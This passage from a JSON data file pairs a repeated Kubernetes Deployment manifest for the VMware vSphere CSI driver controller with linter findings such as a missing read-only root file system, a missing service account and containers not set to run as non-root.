attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vsphere-syncer\" does not have a read-only root file system"
  },
  {
    "id": "8982",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vmware-vsphere-csi-driver-controller-sa\" not found"
  },
  {
    "id": "8983",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"attacher-kube-rbac-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "8984",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-attacher\" is not set to runAsNonRoot"
  },
  {
    "id": "8985",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-driver\" is not set to runAsNonRoot"
  },
  {
    "id": "8986",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
